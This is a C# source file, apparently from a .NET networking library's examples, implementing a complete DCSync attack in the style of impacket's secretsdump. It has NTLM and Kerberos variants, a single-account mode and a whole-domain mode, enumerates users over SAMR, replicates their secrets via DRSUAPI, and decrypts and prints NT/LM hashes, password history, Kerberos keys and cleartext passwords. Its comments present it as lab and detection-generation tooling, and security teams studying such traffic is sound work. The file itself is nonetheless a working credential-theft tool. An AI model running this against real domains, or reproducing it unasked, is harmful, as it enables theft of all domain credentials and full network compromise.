using System.Buffers.Binary;
using DotNetPacket.Core;
using DotNetPacket.Protocols.Dcerpc;
using DotNetPacket.Protocols.Krb5;

namespace DotNetPacket.Examples;

/// <summary>
/// secretsdump (DCSync): extracts an account's secrets by replicating it from a DC over DRSUAPI,
/// the way impacket's <c>examples/secretsdump.py</c> does with the <c>NTDSHashes</c> DRSUAPI path.
/// It drives IDL_DRSBind → IDL_DRSDomainControllerInfo → IDL_DRSCrackNames → IDL_DRSGetNCChanges
/// (EXOP_REPL_OBJ) over the sealed ncacn_ip_tcp transport, then decrypts the replicated secrets.
/// </summary>
/// <remarks>
/// Lab-first and detection-focused. DCSync's wire tell — a DRSGetNCChanges carrying
/// ulExtendedOp = EXOP_REPL_OBJ from a source IP that is not a domain controller — is a classic
/// behavioral detection; this command exists so the SOC can generate and study that traffic.
/// The four commands (NTLM/Kerberos × single/whole-domain) share one DRS replication driver so the
/// only thing that varies on the wire is the authentication leg of the bind.
/// </remarks>
internal static class DcSync
{
    // ----- single account, NTLM auth -------------------------------------------------------------

    public static int Run(string[] args)
    {
        const string usage = "usage: dcsync <domain-fqdn/user[:password]@dc-host> <target-user> [netbios-domain] [epm-port]";
        Creds c = Creds.ResolveOrExit(args, 1, usage);
        string host = c.Host;
        string user = c.User;
        string password = c.PasswordOrEmpty;
        string domainFqdn = c.DomainOrEmpty;
        int i = c.NextIndex;
        if (string.IsNullOrEmpty(domainFqdn) || i >= args.Length)
        {
            Console.Error.WriteLine(usage);
            return 2;
        }

        string targetUser = args[i++];
        string netbios = i < args.Length ? args[i++] : domainFqdn.Split('.')[0].ToUpperInvariant();
        int epmPort = i < args.Length ? int.Parse(args[i]) : 135;

        int port = ResolveEndpoint(host, epmPort, DcerpcInterface.Drsuapi, "drsuapi");
        if (port < 0)
        {
            return 1;
        }

        Console.WriteLine($"drsuapi endpoint on {host}:{port}  (resolved via ept_map)");

        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, port);
        DcerpcBindAck ack = pipe.BindAuthenticated(
            DcerpcInterface.Drsuapi, netbios, user, password, DcerpcAuthLevel.PacketPrivacy);
        if (!ack.Accepted)
        {
            Console.Error.WriteLine($"Authenticated drsuapi bind rejected (result {ack.Result}, reason {ack.Reason}).");
            return 1;
        }

        return DcSyncSingle(pipe, domainFqdn, netbios, targetUser);
    }

    // ----- whole domain, NTLM auth ---------------------------------------------------------------

    /// <summary>
    /// dcsync-all: enumerate the domain's user accounts over SAMR, then DCSync each one by SID
    /// (impacket's DRSGetNCChangesSid path — no per-account DRSCrackNames). This is how secretsdump's
    /// default whole-domain dump works: it replicates each account individually, it does not do one
    /// whole-NC sync. Lab-first, authorized use only.
    /// </summary>
    public static int RunAll(string[] args)
    {
        const string usage = "usage: dcsync-all <domain-fqdn/user[:password]@dc-host> [netbios-domain] [epm-port]";
        Creds c = Creds.ResolveOrExit(args, 1, usage);
        string host = c.Host, user = c.User, password = c.PasswordOrEmpty, domainFqdn = c.DomainOrEmpty;
        int i = c.NextIndex;
        if (string.IsNullOrEmpty(domainFqdn)) { Console.Error.WriteLine(usage); return 2; }
        string netbios = args.Length > i ? args[i++] : domainFqdn.Split('.')[0].ToUpperInvariant();
        int epmPort = args.Length > i ? int.Parse(args[i]) : 135;

        // 1) Enumerate the domain's users (RID + name) and the domain SID over sealed SAMR (NTLM).
        int samrPort = ResolveEndpoint(host, epmPort, DcerpcInterface.Samr, "samr");
        if (samrPort < 0)
        {
            return 1;
        }

        DcerpcPipe samr = DcerpcPipe.OverTcp(host, samrPort);
        if (!samr.BindAuthenticated(DcerpcInterface.Samr, netbios, user, password, DcerpcAuthLevel.PacketPrivacy).Accepted)
        {
            Console.Error.WriteLine("Authenticated samr bind rejected.");
            return 1;
        }

        (SamrSid domainSid, List<SamrRidEntry> users)? enumerated = EnumerateDomainUsers(samr);
        samr.Close();
        if (enumerated is not { } e)
        {
            return 1;
        }

        Console.WriteLine($"Enumerated {e.users.Count} user(s) in {netbios} (domain SID {e.domainSid}).");

        // 2) Bind DRSUAPI (NTLM) and replicate each account by SID.
        int drsPort = ResolveEndpoint(host, epmPort, DcerpcInterface.Drsuapi, "drsuapi");
        if (drsPort < 0)
        {
            return 1;
        }

        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, drsPort);
        if (!pipe.BindAuthenticated(DcerpcInterface.Drsuapi, netbios, user, password, DcerpcAuthLevel.PacketPrivacy).Accepted)
        {
            Console.Error.WriteLine("Authenticated drsuapi bind rejected.");
            return 1;
        }

        return DcSyncWholeDomain(pipe, domainFqdn, e.domainSid, e.users);
    }

    // ----- single account, Kerberos auth ---------------------------------------------------------

    /// <summary>
    /// dcsync with Kerberos (-k): authenticate the DRSUAPI bind with a Kerberos ticket (DCE-style
    /// GSS-NEGOTIATE) instead of NTLM. SPN is host/&lt;dc-fqdn&gt;. Lab-first, authorized use only.
    /// </summary>
    public static int RunKerberos(string[] args)
    {
        const string usage = "usage: dcsync-k <domain-fqdn/user[:password]@dc-host> <target-user> <dc-fqdn> [netbios-domain] [epm-port]";
        Creds c = Creds.ResolveOrExit(args, 1, usage);
        string host = c.Host, user = c.User, password = c.PasswordOrEmpty, domainFqdn = c.DomainOrEmpty;
        int i = c.NextIndex;
        if (string.IsNullOrEmpty(domainFqdn) || i + 1 >= args.Length) { Console.Error.WriteLine(usage); return 2; }
        string targetUser = args[i++];
        string dcFqdn = args[i++];
        string netbios = args.Length > i ? args[i++] : domainFqdn.Split('.')[0].ToUpperInvariant();
        int epmPort = args.Length > i ? int.Parse(args[i]) : 135;

        ServiceTicket ticket = ServiceTicketForDc(host, domainFqdn, user, password, dcFqdn);
        Console.WriteLine($"Service ticket for host/{dcFqdn} (etype {ticket.SessionKeyEtype}).");

        int port = ResolveEndpoint(host, epmPort, DcerpcInterface.Drsuapi, "drsuapi");
        if (port < 0)
        {
            return 1;
        }

        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, port);
        DcerpcBindAck ack = pipe.BindKerberos(DcerpcInterface.Drsuapi, ticket, DcerpcAuthLevel.PacketPrivacy);
        if (!ack.Accepted)
        {
            Console.Error.WriteLine($"Kerberos drsuapi bind rejected (result {ack.Result}, reason {ack.Reason}).");
            return 1;
        }

        Console.WriteLine("Kerberos DRSUAPI bind accepted (DCE-style, sealed).");
        return DcSyncSingle(pipe, domainFqdn, netbios, targetUser);
    }

    // ----- whole domain, Kerberos auth -----------------------------------------------------------

    /// <summary>
    /// dcsync-all-k: whole-domain DCSync over Kerberos. The same host/&lt;dc-fqdn&gt; service ticket
    /// authenticates both the SAMR enumeration bind and the DRSUAPI replication bind (each bind builds
    /// its own AP-REQ/authenticator from the reusable ticket). Lab-first, authorized use only.
    /// </summary>
    public static int RunAllKerberos(string[] args)
    {
        const string usage = "usage: dcsync-all-k <domain-fqdn/user[:password]@dc-host> <dc-fqdn> [netbios-domain] [epm-port]";
        Creds c = Creds.ResolveOrExit(args, 1, usage);
        string host = c.Host, user = c.User, password = c.PasswordOrEmpty, domainFqdn = c.DomainOrEmpty;
        int i = c.NextIndex;
        if (string.IsNullOrEmpty(domainFqdn) || i >= args.Length) { Console.Error.WriteLine(usage); return 2; }
        string dcFqdn = args[i++];
        string netbios = args.Length > i ? args[i++] : domainFqdn.Split('.')[0].ToUpperInvariant();
        int epmPort = args.Length > i ? int.Parse(args[i]) : 135;

        ServiceTicket ticket = ServiceTicketForDc(host, domainFqdn, user, password, dcFqdn);
        Console.WriteLine($"Service ticket for host/{dcFqdn} (etype {ticket.SessionKeyEtype}).");

        // 1) Enumerate the domain's users over a Kerberos-sealed SAMR bind.
        int samrPort = ResolveEndpoint(host, epmPort, DcerpcInterface.Samr, "samr");
        if (samrPort < 0)
        {
            return 1;
        }

        DcerpcPipe samr = DcerpcPipe.OverTcp(host, samrPort);
        if (!samr.BindKerberos(DcerpcInterface.Samr, ticket, DcerpcAuthLevel.PacketPrivacy).Accepted)
        {
            Console.Error.WriteLine("Kerberos samr bind rejected.");
            return 1;
        }

        Console.WriteLine("Kerberos SAMR bind accepted (DCE-style, sealed).");
        (SamrSid domainSid, List<SamrRidEntry> users)? enumerated = EnumerateDomainUsers(samr);
        samr.Close();
        if (enumerated is not { } e)
        {
            return 1;
        }

        Console.WriteLine($"Enumerated {e.users.Count} user(s) in {netbios} (domain SID {e.domainSid}).");

        // 2) Replicate each account by SID over a Kerberos-sealed DRSUAPI bind.
        int drsPort = ResolveEndpoint(host, epmPort, DcerpcInterface.Drsuapi, "drsuapi");
        if (drsPort < 0)
        {
            return 1;
        }

        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, drsPort);
        if (!pipe.BindKerberos(DcerpcInterface.Drsuapi, ticket, DcerpcAuthLevel.PacketPrivacy).Accepted)
        {
            Console.Error.WriteLine("Kerberos drsuapi bind rejected.");
            return 1;
        }

        Console.WriteLine("Kerberos DRSUAPI bind accepted (DCE-style, sealed).");
        return DcSyncWholeDomain(pipe, domainFqdn, e.domainSid, e.users);
    }

    // ----- shared DRS replication driver ---------------------------------------------------------

    /// <summary>Replicate a single named account on an already-bound (sealed) DRSUAPI pipe.</summary>
    private static int DcSyncSingle(DcerpcPipe pipe, string domainFqdn, string netbios, string targetUser)
    {
        byte[]? sessionKey = pipe.SessionKey;
        if (sessionKey is null)
        {
            Console.Error.WriteLine("No DCERPC session key after bind (cannot decrypt secrets).");
            return 1;
        }

        (Drsuapi.BindResult bind, Guid ntdsDsaGuid) = OpenDrs(pipe, domainFqdn);

        string nt4 = $"{netbios}\\{targetUser}";
        Drsuapi.CrackedName cracked = Drsuapi.ParseCrackNamesResponse(
            pipe.Call(Drsuapi.OpnumDrsCrackNames,
                Drsuapi.BuildCrackNamesStub(bind.Handle, Drsuapi.DsNt4AccountName, Drsuapi.DsUniqueIdName, nt4)));
        if (cracked.Status != 0 || string.IsNullOrEmpty(cracked.Name))
        {
            Console.Error.WriteLine($"DRSCrackNames failed for {nt4} (status {cracked.Status}).");
            return 1;
        }

        Guid targetGuid = Guid.Parse(cracked.Name.Trim('{', '}'));
        Console.WriteLine($"DRSCrackNames ok — {nt4} -> {targetGuid}");

        Console.WriteLine("DRSGetNCChanges (EXOP_REPL_OBJ) — the DCSync replication request…");
        DrsReplicaObject obj = Drsuapi.ParseGetNCChangesReply(
            pipe.Call(Drsuapi.OpnumDrsGetNcChanges,
                Drsuapi.BuildGetNCChangesStub(bind.Handle, ntdsDsaGuid, targetGuid)));

        pipe.Call(Drsuapi.OpnumDrsUnbind, BuildUnbindStub(bind.Handle));
        pipe.Close();

        PrintSecrets(obj, sessionKey, targetUser);
        return 0;
    }

    /// <summary>Replicate every enumerated account by SID on an already-bound (sealed) DRSUAPI pipe.</summary>
    private static int DcSyncWholeDomain(
        DcerpcPipe pipe, string domainFqdn, SamrSid domainSid, List<SamrRidEntry> users)
    {
        byte[]? sessionKey = pipe.SessionKey;
        if (sessionKey is null)
        {
            Console.Error.WriteLine("No DCERPC session key after bind.");
            return 1;
        }

        (Drsuapi.BindResult bind, Guid ntdsDsaGuid) = OpenDrs(pipe, domainFqdn);

        Console.WriteLine($"DRSBind ok — replicating {users.Count} account(s) by SID (EXOP_REPL_OBJ)…");
        Console.WriteLine();

        foreach (SamrRidEntry u in users)
        {
            byte[] packedSid = PackSid(domainSid, u.Rid);
            try
            {
                DrsReplicaObject obj = Drsuapi.ParseGetNCChangesReply(
                    pipe.Call(Drsuapi.OpnumDrsGetNcChanges,
                        Drsuapi.BuildGetNCChangesStubBySid(bind.Handle, ntdsDsaGuid, packedSid)));
                PrintSecrets(obj, sessionKey, u.Name);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"  [!] {u.Name} (RID {u.Rid}) failed: {ex.Message}");
            }
        }

        pipe.Call(Drsuapi.OpnumDrsUnbind, BuildUnbindStub(bind.Handle));
        pipe.Close();
        return 0;
    }

    /// <summary>IDL_DRSBind (honouring dwReplEpoch) + IDL_DRSDomainControllerInfo for the NtdsDsaGuid.</summary>
    private static (Drsuapi.BindResult bind, Guid ntdsDsaGuid) OpenDrs(DcerpcPipe pipe, string domainFqdn)
    {
        Drsuapi.BindResult bind = Drsuapi.ParseBindResponse(
            pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub()));
        if (bind.ReplEpoch != 0)
        {
            bind = Drsuapi.ParseBindResponse(
                pipe.Call(Drsuapi.OpnumDrsBind, Drsuapi.BuildBindStub(bind.ReplEpoch)));
        }

        Console.WriteLine($"DRSBind ok — DRS_HANDLE {Convert.ToHexString(bind.Handle)[..16]}… replEpoch {bind.ReplEpoch}");

        Guid ntdsDsaGuid = Drsuapi.ParseDomainControllerInfoNtdsDsaGuid(
            pipe.Call(Drsuapi.OpnumDrsDomainControllerInfo,
                Drsuapi.BuildDomainControllerInfoStub(bind.Handle, domainFqdn, 2)));
        Console.WriteLine($"DRSDomainControllerInfo ok — NtdsDsaObjectGuid {ntdsDsaGuid}");
        return (bind, ntdsDsaGuid);
    }

    /// <summary>Resolve an interface's dynamic ncacn_ip_tcp port via the endpoint mapper.</summary>
    private static int ResolveEndpoint(string host, int epmPort, DcerpcInterface iface, string label)
    {
        DcerpcPipe mapper = DcerpcPipe.OverTcp(host, epmPort);
        if (!mapper.Bind(DcerpcInterface.Epm).Accepted)
        {
            mapper.Close();
            Console.Error.WriteLine("Bind to endpoint mapper rejected.");
            return -1;
        }

        EpmMapResult? mapped = Epm.MapTcp(mapper, iface);
        mapper.Close();
        if (mapped is null)
        {
            Console.Error.WriteLine($"Endpoint mapper has no ncacn_ip_tcp binding for {label}.");
            return -1;
        }

        return mapped.Port;
    }

    /// <summary>Enumerate the account domain's users (RID + name) and its SID over a bound SAMR pipe.</summary>
    private static (SamrSid domainSid, List<SamrRidEntry> users)? EnumerateDomainUsers(DcerpcPipe samr)
    {
        SamrHandleResult server = Samr.Connect(samr);
        SamrEnumResult domains = Samr.EnumerateDomains(samr, server.Handle);
        string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;
        (SamrSid? domainSid, _) = Samr.LookupDomain(samr, server.Handle, accountDomain);
        if (domainSid is null)
        {
            Console.Error.WriteLine($"Could not resolve the domain SID for {accountDomain}.");
            Samr.CloseHandle(samr, server.Handle);
            return null;
        }

        SamrHandleResult dom = Samr.OpenDomain(samr, server.Handle, domainSid);
        List<SamrRidEntry> users = Samr.EnumerateUsers(samr, dom.Handle).Entries.ToList();
        Samr.CloseHandle(samr, dom.Handle);
        Samr.CloseHandle(samr, server.Handle);
        return (domainSid, users);
    }

    /// <summary>Get a reusable service ticket for host/&lt;dc-fqdn&gt; (honours a cached TGT / KRB5CCNAME).</summary>
    private static ServiceTicket ServiceTicketForDc(
        string host, string domainFqdn, string user, string password, string dcFqdn) =>
        KerberosClient.GetServiceTicketForSpn(
            host, domainFqdn.ToUpperInvariant(), user, password, null, null, $"host/{dcFqdn}");

    /// <summary>Packs a domain SID + RID into the 28-byte NT4SID a DSNAME carries.</summary>
    private static byte[] PackSid(SamrSid domainSid, uint rid)
    {
        uint[] subs = domainSid.SubAuthorities.Append(rid).ToArray();
        var w = new List<byte> { domainSid.Revision, (byte)subs.Length };
        w.AddRange(domainSid.IdentifierAuthority);
        foreach (uint s in subs)
        {
            w.AddRange(BitConverter.GetBytes(s));
        }

        return w.ToArray();
    }

    private static void PrintSecrets(DrsReplicaObject obj, byte[] sessionKey, string fallbackName)
    {
        byte[]? sidValue = obj.FirstValue(Drsuapi.AttObjectSid);
        uint rid = sidValue is not null ? RidFromSid(sidValue) : 0;

        string sam = fallbackName;
        byte[]? samValue = obj.FirstValue(Drsuapi.AttSamAccountName);
        if (samValue is not null)
        {
            sam = System.Text.Encoding.Unicode.GetString(samValue);
        }

        string nt = "31d6cfe0d16ae931b73c59d7e0c089c0"; // empty-password NT hash default
        byte[]? encNt = obj.FirstValue(Drsuapi.AttUnicodePwd);
        if (encNt is not null)
        {
            byte[] layer1 = DrsCrypto.DecryptAttributeValue(sessionKey, encNt);
            nt = Convert.ToHexString(DrsCrypto.RemoveDesLayer(layer1, rid)).ToLowerInvariant();
        }

        string lm = "aad3b435b51404eeaad3b435b51404ee"; // empty-password LM hash default
        byte[]? encLm = obj.FirstValue(Drsuapi.AttDbcsPwd);
        if (encLm is not null)
        {
            byte[] layer1 = DrsCrypto.DecryptAttributeValue(sessionKey, encLm);
            lm = Convert.ToHexString(DrsCrypto.RemoveDesLayer(layer1, rid)).ToLowerInvariant();
        }

        Console.WriteLine();
        Console.WriteLine($"{sam}:{rid}:{lm}:{nt}:::");

        PrintHistory(obj, sessionKey, rid, sam, "NT", Drsuapi.AttNtPwdHistory);
        PrintKerberosKeys(obj, sessionKey, sam);
    }

    private static void PrintKerberosKeys(DrsReplicaObject obj, byte[] sessionKey, string sam)
    {
        byte[]? enc = obj.FirstValue(Drsuapi.AttSupplementalCredentials);
        if (enc is null)
        {
            return;
        }

        SupplementalCredentials creds = SupplementalCredentials.Parse(
            DrsCrypto.DecryptAttributeValue(sessionKey, enc));

        if (creds.KerberosKeys.Count > 0)
        {
            Console.WriteLine("  Kerberos keys:");
            foreach (KerberosStoredKey k in creds.KerberosKeys)
            {
                Console.WriteLine($"    {sam}:{k.KeyTypeName}:{Convert.ToHexString(k.Key).ToLowerInvariant()}");
            }
        }

        if (creds.Cleartext is not null)
        {
            Console.WriteLine($"    {sam}:CLEARTEXT:{creds.Cleartext}");
        }
    }

    private static void PrintHistory(
        DrsReplicaObject obj, byte[] sessionKey, uint rid, string sam, string label, uint attr)
    {
        byte[]? enc = obj.FirstValue(attr);
        if (enc is null)
        {
            return;
        }

        byte[] decrypted = DrsCrypto.DecryptAttributeValue(sessionKey, enc);
        int count = decrypted.Length / 16;
        if (count <= 1)
        {
            return; // only the current hash; nothing historical to show
        }

        Console.WriteLine($"  {label} password history ({count} entries):");
        for (int i = 0; i < count; i++)
        {
            byte[] h = DrsCrypto.RemoveDesLayer(decrypted[(i * 16)..((i + 1) * 16)], rid);
            Console.WriteLine($"    {sam}_history{i}:{rid}:{Convert.ToHexString(h).ToLowerInvariant()}");
        }
    }

    private static uint RidFromSid(byte[] sid)
    {
        // SID: revision(1) + subAuthCount(1) + idAuth(6) + subAuths(4*count). RID = last sub-authority.
        if (sid.Length < 8)
        {
            return 0;
        }

        return BinaryPrimitives.ReadUInt32LittleEndian(sid.AsSpan(sid.Length - 4));
    }

    private static byte[] BuildUnbindStub(byte[] handle)
    {
        var ndr = new NdrWriter();
        ndr.WriteContextHandle(handle);
        return ndr.ToArray();
    }
}
